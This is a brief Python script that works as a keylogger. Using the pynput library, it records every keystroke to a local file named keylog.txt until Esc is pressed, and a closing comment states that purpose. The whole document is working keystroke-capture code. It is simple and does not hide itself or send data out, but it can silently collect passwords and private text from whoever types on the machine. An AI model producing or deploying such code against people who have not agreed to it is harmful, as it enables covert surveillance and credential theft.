import pynput.keyboard

def on_press(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = str(key)
    with open("keylog.txt", "a") as f:
        f.write(key_str)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
# This script will log all the keys pressed on the keyboard and save them to a file called keylog.txt
